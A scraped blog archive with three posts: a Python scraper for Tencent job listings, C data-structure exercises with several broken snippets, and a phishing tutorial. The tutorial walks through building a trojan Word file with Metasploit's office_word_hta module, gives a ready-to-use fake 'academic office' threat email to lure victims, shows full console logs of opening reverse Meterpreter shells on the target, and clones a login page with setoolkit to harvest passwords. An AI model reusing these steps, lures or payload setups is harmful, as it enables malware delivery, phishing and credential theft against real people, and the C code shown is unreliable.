此次我们的任务就是分别利用上述三种解析工具来接下该网站下的社会招聘中的所有数据。 网页分析：通过该网站的社会招聘的首页，我们可以发现如下三条主要信息： 首页url连接为https://hr.tencent.com/position.php 一共有288页的数据，每页10个职位，总职位共计2871 数据字段有五个，分别为：职位名称、职位类别、招聘人数、工作地点、职位发布时间 既然我们解析的是该网站下所有职位数据，再者我们停留在第一页也没有发现其他有价值的信息，不如进入第二页看看，这时我们可以发现网站的url链接有了一个比较明显的变化，即原链接在用户端提交了一个start参数，此时链接为https://hr.tencent.com/position.php?&amp;start=10#a，陆续打开后面的页面我们不难发现其规律：每一页提交的start参数以10位公差进行逐步递增。之后，我们使用谷歌开发者工具来审查该网页，我们可以发现全站皆为静态页面，这位我们解析省下了不少麻烦，我们需要的数据就静态的放置在table标签内，如下所示： 下面我们具体来分别使用以上三种工具来解析该站所有职位数据。 案例源码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import requestsfrom bs4 import BeautifulSoupfrom lxml import etreefrom pyquery import PyQuery as pqimport itertoolsimport pandas as pdclass TencentPosition(): \"\"\" 功能： 定义初始变量 参数： start： 起始数据 \"\"\" def __init__(self, start): self.url = \"https://hr.tencent.com/position.php?&amp;start=&#123;&#125;#a\".format(start) self.headers = &#123; \"Host\": \"hr.tencent.com\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\", &#125; self.file_path = \"./TencentPosition.csv\" \"\"\" 功能： 请求目标页面 参数： url： 目标链接 headers： 请求头 返回： html，页面源码 \"\"\" def get_page(self, url, headers): res = requests.get(url, headers=headers) try: if res.status_code == 200: return res.text else: return self.get_page(url, headers=headers) except RequestException as e: return self.get_page(url, headers=headers) \"\"\" 功能： Beautiful Soup解析页面 参数： html： 请求页面源码 \"\"\" def soup_analysis(self, html): soup = BeautifulSoup(html, \"lxml\") tr_list = soup.find(\"table\", class_=\"tablelist\").find_all(\"tr\") for tr in tr_list[1:-1]: position_info = [td_data for td_data in tr.stripped_strings] self.settle_data(position_info=position_info) \"\"\" 功能： xpath解析页面 参数： html： 请求页面源码 \"\"\" def xpath_analysis(self, html): result = etree.HTML(html) tr_list = result.xpath(\"//table[@class='tablelist']//tr\") for tr in tr_list[1:-1]: position_info = tr.xpath(\"./td//text()\") self.settle_data(position_info=position_info) \"\"\" 功能： pyquery解析页面 参数： html： 请求页面源码 \"\"\" def pyquery_analysis(self, html): result = pq(html) tr_list = result.find(\".tablelist\").find(\"tr\") for tr in itertools.islice(tr_list.items(), 1, 11): position_info = [td.text() for td in tr.find(\"td\").items()] self.settle_data(position_info=position_info) \"\"\" 功能： 职位数据整合 参数： position_info： 字段数据列表 \"\"\" def settle_data(self, position_info): position_data = &#123; \"职位名称\": position_info[0].replace(\"\\xa0\", \" \"), # replace替换\\xa0字符防止转码error \"职位类别\": position_info[1], \"招聘人数\": position_info[2], \"工作地点\": position_info[3], \"发布时间\": position_info[-1], &#125; print(position_data) self.save_data(self.file_path, position_data) \"\"\" 功能： 数据保存 参数： file_path： 文件保存路径 position_data： 职位数据 \"\"\" def save_data(self, file_path, position_data): df = pd.DataFrame([position_data]) try: df.to_csv(file_path, header=False, index=False, mode=\"a+\", encoding=\"gbk\") # 数据转码并换行存储 except: pass if __name__ == \"__main__\": for page, index in enumerate(range(287)): print(\"正在爬取第&#123;&#125;页的职位数据:\".format(page+1)) tp = TencentPosition(start=(index*10)) tp_html = tp.get_page(url=tp.url, headers=tp.headers) tp.pyquery_analysis(html=tp_html) print(\"\\n\") 部分结果如下： 总结在本篇文章中，首先我们分别介绍了Beautiful Soup、XPath、pyquery的常见操作，之后通过使用该三种解析工具来爬取腾讯招聘网中所有的职位招聘数据，从而进一步让读者有一个更加深刻的认识。该案例中，由于本篇文章重点在于网站页面的解析方法，所以未使用多线程、多进程，爬取所有的数据爬取的时间在两分钟左右，在之后的文章中有时间的话会再次介绍多线程多进程的使用，案例中的解析方式都已介绍过，所以读者阅读源码即可。 注意：本文章中所有的内容皆为在实际开发中常见的一些操作，并非所有，想要进一步提升等级的读者务必请阅读官方文档。 2019-01-01,By Zero","path":"2019/01/01/网页爬虫之页面解析/"},{"title":"数据结构学习笔记</center>","text":"数据结构学习笔记①设计一个算法，将顺序表中的数据倒置 12345678910void reverse(Sqlist &amp;L)&#123; int i, j; int temp; for (i = 0, j = L.length - 1; i &lt; j; ++i, --j) &#123; temp = L.data[i]; L.data[i] = L.data[j]; L.data[j] = temp; &#125;&#125; ②删除顺序表中i到j的元素 123456789void delete(Sqlist &amp;L, int i, int j)&#123; int k; for (k = j + 1; k &lt; L.length; ++k) &#123; L.data[i] = L.data[k]; ++i; &#125; L.length -= j - i + 1;&#125; ③将大于和小于首元素的元素分别移至两边 12345678910111213141516171819void move(Sqlist &amp;L)&#123; int temp; int i = 0, j = L.length - 1; temp = L.data[i]; while (i &lt; j) &#123; while (i &lt; j &amp;&amp; temp &lt; L.data[j]) --j; if (i &lt; j) &#123; L.data[i] = L.data[j]; ++i; &#125; while (i&lt;j &amp;&amp; temp&gt;L.data[i]) ++i; if (i &lt; j) &#123; L.data[j] = L.data[i]; --j; &#125; &#125; L.data[i] = temp;&#125; ④删除递增非空单链表中重复的元素 法一：123456789101112131415void delsl1(LNode *L)&#123; LNode *p, *q; p = L-&gt;next; while (p-&gt;next != NULL) &#123; if (p-&gt;data == p-&gt;next-&gt;data) &#123; q = p-&gt;next; p-&gt;next = q-&gt;next; free(q); &#125; else &#123; p = p-&gt;next; &#125; &#125;&#125; 法二： 12345678910111213141516void delsel2(Sqlist *L)&#123; LNode *p = L-&gt;next, *q = p-&gt;next, *r; while (q != NULL &amp;&amp; p-&gt;data == q-&gt;data) q = q-&gt;next; if (q != NULL) &#123; p = p-&gt;next; p-&gt;data = q-&gt;data; &#125; q = p-&gt;next; p-&gt;next = NULL; While(q != NULL) &#123; r = q; q = q-&gt;next; free(r); &#125;&#125; ⑤删除链表中的最小值的节点 1234567891011121314void delminnode(LNode *L)&#123; LNode *pre = L, *p = pre-&gt;next, *minp = p, *minpre = pre; while (p != NULL) &#123; pre = p; p = p-&gt;next; if (minp-&gt;data &gt; p-&gt;data) &#123; minp = p; minpre = pre; &#125; &#125; minpre-&gt;next = minp-&gt;next; free(minp);&#125; ⑥尾插发逆置链表 1234567891011void reverse(LNode *L)&#123; LNode *p = L-&gt;next, q; L-&gt;next = NULL; while (p != NULL) &#123; q = p-&gt;next; p-&gt;next = L-&gt;next; L-&gt;next = p; p = q; &#125;&#125; ⑦将一个链表分割成分别存有奇数和偶数的两个链表 123456789101112131415161718void split(LNode *A, LNode *&amp;B)&#123; B = (LNode*)malloc(sizeof(LNode)); B-&gt;next = NUll; LNode *p, *q, *r; p = A; r = B; while (p-&gt;next != NULL) &#123; if (p-&gt;next-&gt;data % == 0) &#123; q = p-&gt;next; p-&gt;next = q-&gt;next; q-&gt;next=NULL; r-&gt;next = q; p = q; &#125; else p = p-&gt;next; &#125;&#125; ⑧逆序打印链表(递归) 1234567void reprint(LNode *L)&#123; if (L != NULL) &#123; reprint(L-&gt;next); cout &lt;&lt; L - data &lt;&lt; \" \"; &#125;&#125; ⑧链表查找倒数第k个值 123456789101112131415161718int find(LNode *head, int k)&#123; int i=1; p = head; q = head-&gt;next; while (q != NULL) &#123; q = q-&gt;next; ++i; if (i &gt; k) &#123; p = p-&gt;next; &#125; &#125; if (p == head) return 0; else &#123; count &lt;&lt; p-&gt;data; return 1; &#125;&#125; ⑨使序列{0，1，2，$\\cdots n$}变成{p，$\\cdots$ n，0，$\\cdots$p-1}(逆置三次) 12345678910111213141516171819void reverse(int R[], int l, int r)&#123; int temp; int i, j; for (i = l, j = r; i &lt; j; ++i, --j) &#123; temp = R[i]; R[i] = R[j]; R[j] = temp; &#125;&#125;void RCR(int R[], int n, int p)&#123; if (p &lt;= 0 || p &gt;= n) cout &lt;&lt; \"eroor\" &lt;&lt; endl; else &#123; reverse(R, 0, p - 1); reverse(R, p, n - 1); reverse(R, 0, n - 1); &#125;&#125; ⑩找到序列中数目是否含有大于$\\frac{n}{2}$的数据 1234567891011121314151617181920212223int majority(int A[], int n)&#123; int i, count=1; int temp; temp = A[0] for (i = 1; i &lt; n; i++) &#123; if (temp == A[i]) ++count; else &#123; if (count &gt; 0) --count; else &#123; temp = A[i]; count = 1; &#125; &#125; &#125; if (count &gt; 0)&#123; for (i = count = 0; i &lt; n; i++) &#123; if (temp == A[i]) ++count; &#125; &#125; if (count &gt; n / 2) return temp; else return -1;&#125;","path":"2018/12/25/数据结构学习笔记/"},{"title":"渗透攻击","text":"前言已经有两个多月没有记录了，最近一直在忙于复习408、线代，还有kaggle的学习，原本打算暂时不再更新文章的，但是最近收到不少了类似像教务处通知、竞赛确认、务必查收等社工邮件亦或短信，是在是可恶至极，所以就再来水一篇文章吧。之后Zero搜索下相关新闻咨询，发现类似诈骗案件的报道还真不少，一大叠一大叠的层出不穷，令人遗憾的是有不少用户抵抗不了自己的好奇心从而咬住了攻击者的“鱼钩”，故而给对方有了可乘之机。 Zero最近同样收到了不少这种邮件，比如昨天下午收到的这封： 虽然类似这种现象很是常见，但是万变不离其宗，攻击者主要是利用社会工程学 + 人们对事物的好奇心理来实行攻击。你的兴趣爱好、个人情感甚至是你的某一篇朋友圈等信息对于他们来说就富含了极大的价值，他们往往能够从中洞察一些别样的信息，也许这些不起眼的信息正是他成功攻击的关键。 所以说，在日常生活中，加强我们的网络安全意识是有必要的，不要天真的以为这些离你还很远，等到来临的那一刻恐怕就为时已晚了。在之前的文章中，已经介绍了无线wifi的入侵，可见：Wifi破解本文主要介绍以下一些常见的攻击手段，希望能对读者有所帮助： 社工邮件 钓鱼网站 安卓渗透 短信诈骗 免责申明任何具有一定侵略性的网络攻击行为都属于非法操作。本文中所有的内容是在自家寝室进行，所攻击的wifi也是自家寝室内的，该文仅供学习，切勿用于非法操作，一切后果由使用者本人负责。（会坐牢的） 环境准备关于Kali Linux的下载安装，之前的文章已经有所介绍，这里就不再重述了。 攻击机：Kali Linux 靶机：Windows 7，android 工具：Metasploit、setoolkit 社工邮件在带有诈骗性的邮件中往往包含了钓鱼链接、木马文件之类的信息，主题中常常带有一些异奇描述，而这些描述则会带你落入圈套，博主不是很会描述，总之核心就是社会工程学。为了让大家理解其中的含义，下面拿诸葛建伟老师的《Metasploit渗透测试魔鬼训练营》一书中的一个例子来说明下： 看到没有，类似上图中的邮件内容，就是酱紫的。下面我们具体来介绍下实现的过程，这次使用的是exploit/windows/fileformat/office_word_hta模块来生成一个带有木马的word文件，目标打开该文件之后，将会在Kali终端获得目标的session，进而控制对方的设备并获取有价值得信息。 木马文件的生成 进入Metasploit终端1msfconsole 执行之后，我们将进入Metasploit终端，如下图所示： 引入exploit/windows/fileformat/office_word_hta模块 进入到Metasploit之后，通过之前的分析，我们是要生成一个木马文件来对选择的目标进行攻击，所以我们需要查询该Kali Linux系统中是否集成了所用模块，在本次我们拿.docword文件来进行演示，为此执行如下命令：1search office 命令执行后显示如下： 由上图我们可以发现，在对模块进行查找的过程中成功找到了三个模块，此次我们使用的是exploit/windows/fileformat/office_word_hta模块，执行以下命令来引入该命令：1use exploit/windows/fileformat/office_word_hta 参数设置 引入模块之后，我们还需要查询该模块所需要的参数从而发动监听，命令如下：1show options 通过上图，我们可以发现，所需要的参数主要有以下一些：12SRVHOST # 攻击机的ip地址，即Kali LinuxFIlENAME # 自定义生成的文件名 通过上述参数的讲解之后，我们对其进行一一设置，命令如下：123set SRVHOST 192.168.31.103 # Kali的ip地址set FILENAME # 自定义文件名# 其他参数默认即可 执行渗透攻击模块exploit 在对参数进行设置之后，我们便能进一步执行exploit(或者run)开始渗透了1exploit/run 执行后的结果如下： 通过上图，我们主要分析如下信息： 所开启的端口：4444、8080 链接地址：http://192.168.31.103:8080/default.hta 木马文件路径：/root/.msf4/local/教务处通知务必查收.doc 至此，我们的木马文件就已经生成了，我们需要进一步的加以利用。 社工OK，现在我们需要通过邮件来将该文件发送给攻击目标了，在对方下载并打开的一瞬间也就是他落入陷阱的时候，在这里我们使用的是QQ邮件，然后博主还不想坐牢，所以就拿自己的账号来演示了，攻击账号：510087153@qq.com，目标账号：26647879@qq.com。好的，下面我们来模拟一下邮件的发送过程，邮件的主题及内容就要考验我们的欺骗等级了。为了提高对方掉入陷阱的概率，我们通过510087153@qq.com账号编辑邮件的主题及正文内容编写如下（这个不是很会写，就随便写写吧，其实在实际攻击的过程中是需要收集目标大量数据的）：123456789主题：教务处通知，务必查看正文：Zero同学： 你好，我是教务处的王老师，主要负责通知有无法正常毕业可能的学生。 从最近几学期你的在校表现来看，你有长期旷课、打架斗殴、成帮结派的行为，对此给学校带来许多负面影响。为此教务处将对你下达黄牌警告，为了保证你的正常毕业，还请仔细阅读附件内容。如若不然，则将会采取进一步的措施：向家长通报、升旗仪式上通报、公告栏通报。仔细阅读附件后，务必在1小时内给予回复，否则后果自负。 教务处，王老师 编辑好后，如下所示。 OK，供给端的操作至此就已经完成了，确认无误并没有明显造假痕迹之后，我们发送邮件然后等待对方“咬钩”即可。 之后，我们回到目标机windows，发现目标账号此时已经收到了一封来自教务处的邮件，我们打开邮件既能见到如上邮件内容（此刻目标的心理活动请读者自行脑补，这里就不再描述了）。待目标阅读完成之后并将附件教务处通知务必.doc下载到本地，若目标打开文件之后则已经“咬钩”了。 OK，不管目标打开的文件是空也好，乱码也罢，只要他鼠标左键双击的一瞬间则已经达到了攻击者的目的了。这是，我们再次回到Kali Linux的终端，显示内容如下所示： 通过上图，我们发现已经获得了目标的session会话，并显示了目标的ip，此时我们就能拿对方的服务器“为所欲为”了，比如摄像头监控、映射文件、桌面捕捉等等坐牢性操作。我们可通过如下命令获取对方的终端权限：12345sessions -l sessions -i 1shellexitbackground 补充：获取到目标终端之后也许会乱码，我们执行chcp 65001即可解决 之后的Dos命令操作这里就不再细说了，有兴趣的朋友可以跳转之前写的一篇文章： 完整命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122root@kali:~# msfconsole [-] Failed to connect to the database: could not connect to server: Connection refused Is the server running on host \"localhost\" (::1) and accepting TCP/IP connections on port 5432?could not connect to server: Connection refused Is the server running on host \"localhost\" (127.0.0.1) and accepting TCP/IP connections on port 5432? Call trans opt: received. 2-19-98 13:24:18 REC:Loc Trace program: running wake up, Neo... the matrix has you follow the white rabbit. knock, knock, Neo. (`. ,-, ` `. ,;' / `. ,'/ .' `. X /.' .-;--''--.._` ` ( .' / ` , ` ' Q ' , , `._ \\ ,.| ' `-.;_' : . ` ; ` ` --,.._; ' ` , ) .' `._ , ' /_ ; ,''-,;' ``- ``-..__``--` https://metasploit.com =[ metasploit v4.17.25-dev ]+ -- --=[ 1828 exploits - 1033 auxiliary - 318 post ]+ -- --=[ 541 payloads - 44 encoders - 10 nops ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]msf &gt; use exploit/windows/fileformat/office_word_hta msf exploit(windows/fileformat/office_word_hta) &gt; show optionsModule options (exploit/windows/fileformat/office_word_hta): Name Current Setting Required Description ---- --------------- -------- ----------- FILENAME msf.doc yes The file name. SRVHOST 0.0.0.0 yes The local host to listen on. This must be an address on the local machine or 0.0.0.0 SRVPORT 8080 yes The local port to listen on. SSL false no Negotiate SSL for incoming connections SSLCert no Path to a custom SSL certificate (default is randomly generated) URIPATH default.hta yes The URI to use for the HTA fileExploit target: Id Name -- ---- 0 Microsoft Office Wordmsf exploit(windows/fileformat/office_word_hta) &gt; set SRVHOST 192.168.31.103SRVHOST =&gt; 192.168.31.103msf exploit(windows/fileformat/office_word_hta) &gt; set FIlENAME 教务处通知务必查收.docFIlENAME =&gt; 教务处通知务必查收.docmsf exploit(windows/fileformat/office_word_hta) &gt; exploit[*] Exploit running as background job 0.[*] Started reverse TCP handler on 192.168.31.103:4444 [+] 教务处通知务必查收.doc stored at /root/.msf4/local/.doc[*] Using URL: http://192.168.31.103:8080/default.hta[*] Server started.msf exploit(windows/fileformat/office_word_hta) &gt; [*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 1 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52520) at 2018-12-14 18:45:45 +0800[*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 2 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52519) at 2018-12-14 18:45:48 +0800[*] Sending stage (179779 bytes) to 192.168.31.232[*] Meterpreter session 3 opened (192.168.31.103:4444 -&gt; 192.168.31.232:52521) at 2018-12-14 18:45:48 +0800msf exploit(windows/fileformat/office_word_hta) &gt; sessions -lActive sessions=============== Id Name Type Information Connection -- ---- ---- ----------- ---------- 1 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52520 (192.168.31.232) 2 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52519 (192.168.31.232) 3 meterpreter x86/windows TXJ-PC\\TXJ @ TXJ-PC 192.168.31.103:4444 -&gt; 192.168.31.232:52521 (192.168.31.232)msf exploit(windows/fileformat/office_word_hta) &gt; sessions -i 1[*] Starting interaction with 1...meterpreter &gt; shellProcess 3980 created.Channel 3 created.Microsoft Windows [?汾 6.1.7601]??????? (c) 2009 Microsoft Corporation???????????????C:\\Users\\TXJ\\Desktop&gt;chcp 65001chcp 65001Active code page: 65001C:\\Users\\TXJ\\Desktop&gt;dirdir Volume in drive C is Windows Volume Serial Number is 12B9-032A Directory of C:\\Users\\TXJ\\Desktop2018/12/14 18:32 &lt;DIR&gt; .2018/12/14 18:32 &lt;DIR&gt; ..2018/12/14 18:36 2,461 Google Chrome.lnk2018/12/14 18:42 &lt;DIR&gt; images2018/12/08 04:27 95 新建文本文档.txt 2 File(s) 2,556 bytes 3 Dir(s) 30,969,548,800 bytes freeC:\\Users\\TXJ\\Desktop&gt; 钓鱼网站除了上述社工邮件之外，在实际过程中钓鱼网站也是比较常见的。钓鱼网站主要是先通过爬虫手段先爬取常见的登录页面，比如像163邮箱之类的常见应用。下面附一个Python的小爬虫Demo来爬取163登录页并保存：12345678910111213141516171819202122232425262728try: import requestsexcept: import os print(\"The package is downloading......\") os.system(\"python -m pip install --upgrade pip &amp;&amp; pip install requests\") print(\"The requirement already satisfied\")def get_page(url, headers): try: if requests.get(url=url, headers=headers).status_code == 200: request = requests.get(url=url, headers=headers) request.encoding = \"utf-8\" return request.text else: print(\"Error! Please resend the request\") return get_page(url=url, headers=headers).text except RequestException as e: print(\"&#123;&#125;&#123;&#125;Error! Please resend the request\".format(e, \"\\n\")) return get_page(url=url, headers=headers).textif __name__ == \"__main__\": headers = &#123; \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\" &#125; html = get_page(url = \"https://mail.163.com/\", headers=headers) with open(\"163maillogin.html\", \"w\", encoding=\"utf-8\") as f: f.write(html) 爬取好后，我们就能将该页面发布到自己的服务器中然后等待受害者的登录，待其输入账号密码之后就会在我们的Kali Linux终端截取到账号及密码了，下面我们通过setoolkit工具来模拟实现该钓鱼网站的过程。 setoolkit攻击在Kali终端执行setoolkit，执行之后我们会见到如下内容： 之后，我们选择第一个选项Social-Engineering Attacks社会工程学，选择并回车之后，我们可见如下内容：1234567891011121314Select from the menu: 1) Spear-Phishing Attack Vectors ＃ 鱼叉式钓鱼攻击向量 2) Website Attack Vectors ＃ 网页攻击向量 3) Infectious Media Generator ＃ 媒介感染生成器 4) Create a Payload and Listener ＃ 生成一个payload并监听 5) Mass Mailer Attack ＃ 大规模邮件钓鱼 6) Arduino-Based Attack Vector ＃ Arduino的攻击 7) Wireless Access Point Attack Vector ＃ 无线接入点攻击 8) QRCode Generator Attack Vector ＃ 二维码攻击 9) Powershell Attack Vectors ＃ powershell攻击10) Third Party Modules ＃ 第三方模块 99) Return back to the main menu. 通过上述11个选项的解释，我们已经认识到了该社会工程学的强大了并对社会工程学setoolkit工具有了一个大概的了解了，此次我们用到的是第二个模块Website Attack Vectors，之后进一步进行第三个选项Credential Harvester Attack Method，随后选择第二个Site Cloner。执行之后，我们可见如下内容： 之后我们输入目标网页从而将爬取网页的源代码并创建一个80端口的服务，比如此次我们拿知乎的登录首页来进行演示，为此我们输入https://www.zhihu.com/signup?next=%2F，如上述所编代码一样，该命令会将知乎的登录页面爬取下来然后将该页面发布到本机的80端口服务中，我们来访问该页面看看： OK，如你所见，此时的页面除了域名不一样之外，其他的内容完全是一模一样的，在实际“钓鱼”的过程中，攻击者往往会将域名尽量的相似化，比如pq.com、pp.com、zhlhu.com、zhini.com。这就好比考试，命题人总会出一些及其容易错的题目，也许你一个不小心就会失算从而正中命题者的陷阱，比如Zero前几天遇到的几道题： 命题人往往会根据自己的自身经验尝试着去抓住大部分考生的弱点，从而得到一个选拔的效果，待你发现自身的错误之后恐怕为时已晚，分已经丢了，我们此刻能做的也只有扇扇自己几个耳光来小惩罚以下自己。 跑题了，回来吧。 社会工程学也是一样的，目标一不留神就会“咬钩”。如上所述，我们访问之后会发现一模一样的页面，此时我们尝试着输入账号密码试试，会发现用户端并没有什么明显的反应，我们再来回到Kali Linux看看，果然，你的账号、密码已经成功被截取到了。账号、密码被攻击者拿到之后，后面所发生的事我想不必介绍大家也都了解了。 完整命令123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX XXXX MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMMMMssssssssssssssssssssssssssMMMMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMss''' '''ssMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMyy'' ''yyMMMMMMMMMMMM XXXX MMMMMMMMyy'' ''yyMMMMMMMM XXXX MMMMMy'' ''yMMMMM XXXX MMMy' 'yMMM XXXX Mh' 'hM XXXX - - XXXX XXXX :: :: XXXX MMhh. ..hhhhhh.. ..hhhhhh.. .hhMM XXXX MMMMMh ..hhMMMMMMMMMMhh. .hhMMMMMMMMMMhh.. hMMMMM XXXX ---MMM .hMMMMdd:::dMMMMMMMhh.. ..hhMMMMMMMd:::ddMMMMh. MMM--- XXXX MMMMMM MMmm'' 'mmMMMMMMMMyy. .yyMMMMMMMMmm' ''mmMM MMMMMM XXXX ---mMM '' 'mmMMMMMMMM MMMMMMMMmm' '' MMm--- XXXX yyyym' . 'mMMMMm' 'mMMMMm' . 'myyyy XXXX mm'' .y' ..yyyyy.. '''' '''' ..yyyyy.. 'y. ''mm XXXX MN .sMMMMMMMMMss. . . .ssMMMMMMMMMs. NM XXXX N` MMMMMMMMMMMMMN M M NMMMMMMMMMMMMM `N XXXX + .sMNNNNNMMMMMN+ `N N` +NMMMMMNNNNNMs. + XXXX o+++ ++++Mo M M oM++++ +++o XXXX oo oo XXXX oM oo oo Mo XXXX oMMo M M oMMo XXXX +MMMM s s MMMM+ XXXX +MMMMM+ +++NNNN+ +NNNN+++ +MMMMM+ XXXX +MMMMMMM+ ++NNMMMMMMMMN+ +NMMMMMMMMNN++ +MMMMMMM+ XXXX MMMMMMMMMNN+++NNMMMMMMMMMMMMMMNNNNMMMMMMMMMMMMMMNN+++NNMMMMMMMMM XXXX yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy XXXX m yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy m XXXX MMm yMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMy mMM XXXX MMMm .yyMMMMMMMMMMMMMMMM MMMMMMMMMM MMMMMMMMMMMMMMMMyy. mMMM XXXX MMMMd ''''hhhhh odddo obbbo hhhh'''' dMMMM XXXX MMMMMd 'hMMMMMMMMMMddddddMMMMMMMMMMh' dMMMMM XXXX MMMMMMd 'hMMMMMMMMMMMMMMMMMMMMMMh' dMMMMMM XXXX MMMMMMM- ''ddMMMMMMMMMMMMMMdd'' -MMMMMMM XXXX MMMMMMMM '::dddddddd::' MMMMMMMM XXXX MMMMMMMM- -MMMMMMMM XXXX MMMMMMMMM MMMMMMMMM XXXX MMMMMMMMMy yMMMMMMMMM XXXX MMMMMMMMMMy. .yMMMMMMMMMM XXXX MMMMMMMMMMMMy. .yMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMy. .yMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMs. .sMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMss. .... .ssMMMMMMMMMMMMMMMMMM XXXX MMMMMMMMMMMMMMMMMMMMNo oNNNNo oNMMMMMMMMMMMMMMMMMMMM XXXX XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX .o88o. o8o . 888 `\" `\"' .o8 o888oo .oooo.o .ooooo. .ooooo. oooo .ooooo. .o888oo oooo ooo 888 d88( \"8 d88' `88b d88' `\"Y8 `888 d88' `88b 888 `88. .8' 888 `\"Y88b. 888 888 888 888 888ooo888 888 `88..8' 888 o. )88b 888 888 888 .o8 888 888 .o 888 . `888' o888o 8\"\"888P' `Y8bod8P' `Y8bod8P' o888o `Y8bod8P' \"888\" d8' .o...P' `XER0'[---] The Social-Engineer Toolkit (SET) [---][---] Created by: David Kennedy (ReL1K) [---] Version: 7.7.9 Codename: 'Blackout'[---] Follow us on Twitter: @TrustedSec [---][---] Follow me on Twitter: @HackingDave [---][---] Homepage: https://www.trustedsec.com [---] Welcome to the Social-Engineer Toolkit (SET). The one stop shop for all of your SE needs. Join us on irc.freenode.net in channel #setoolkit The Social-Engineer Toolkit is a product of TrustedSec. Visit: https://www.trustedsec.com It's easy to update using the PenTesters Framework! (PTF)Visit https://github.com/trustedsec/ptf to update all your tools! Select from the menu: 1) Spear-Phishing Attack Vectors 2) Website Attack Vectors 3) Infectious Media Generator 4) Create a Payload and Listener 5) Mass Mailer Attack 6) Arduino-Based Attack Vector 7) Wireless Access Point Attack Vector 8) QRCode Generator Attack Vector 9) Powershell Attack Vectors 10) SMS Spoofing Attack Vector 11) Third Party Modules 99) Return back to the main menu.set&gt; 2The Web Attack module is a unique way of utilizing multiple web-based attacks in order to compromise the intended victim.The Java Applet Attack method will spoof a Java Certificate and deliver a metasploit based payload. Uses a customized java applet created by Thomas Werth to deliver the payload.The Metasploit Browser Exploit method will utilize select Metasploit browser exploits through an iframe and deliver a Metasploit payload.The Credential Harvester method will utilize web cloning of a web- site that has a username and password field and harvest all the information posted to the website.The TabNabbing method will wait for a user to move to a different tab, then refresh the page to something different.The Web-Jacking Attack method was introduced by white_sheep, emgent. This method utilizes iframe replacements to make the highlighted URL link to appear legitimate however when clicked a window pops up then is replaced with the malicious link. You can edit the link replacement settings in the set_config if its too slow/fast.The Multi-Attack method will add a combination of attacks through the web attack menu. For example you can utilize the Java Applet, Metasploit Browser, Credential Harvester/Tabnabbing all at once to see which is successful.The HTA Attack method will allow you to clone a site and perform powershell injection through HTA files which can be used for Windows-based powershell exploitation through the browser. 1) Java Applet Attack Method 2) Metasploit Browser Exploit Method 3) Credential Harvester Attack Method 4) Tabnabbing Attack Method 5) Web Jacking Attack Method 6) Multi-Attack Web Method 7) Full Screen Attack Method 8) HTA Attack Method 99) Return to Main Menuset:webattack&gt;3 The first method will allow SET to import a list of pre-defined web applications that it can utilize within the attack. The second method will completely clone a website of your choosing and allow you to utilize the attack vectors within the completely same web application you were attempting to clone. The third method allows you to import your own website, note that you should only have an index.html when using the import website functionality. 1) Web Templates 2) Site Cloner 3) Custom Import 99) Return to Webattack Menuset:webattack&gt;2[-] Credential harvester will allow you to utilize the clone capabilities within SET[-] to harvest credentials or parameters from a website as well as place them into a report---------------------------------------------------------------------------------- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS * IMPORTANT * ---The way that this works is by cloning a site and looking for form fields torewrite. If the POST fields are not usual methods for posting forms this could fail. If it does, you can always save the HTML, rewrite the forms tobe standard forms and use the \"IMPORT\" feature. Additionally, really important:If you are using an EXTERNAL IP ADDRESS, you need to place the EXTERNALIP address below, not your NAT address. Additionally, if you don't knowbasic networking concepts, and you have a private IP address, you willneed to do port forwarding to your NAT IP address from your external IPaddress. A browser doesns't know how to communicate with a private IPaddress, so if you don't specify an external IP address if you are usingthis from an external perpective, it will not work. This isn't a SET issuethis is how networking works.set:webattack&gt; IP address for the POST back in Harvester/Tabnabbing [192.168.31.103]:[-] SET supports both HTTP and HTTPS[-] Example: 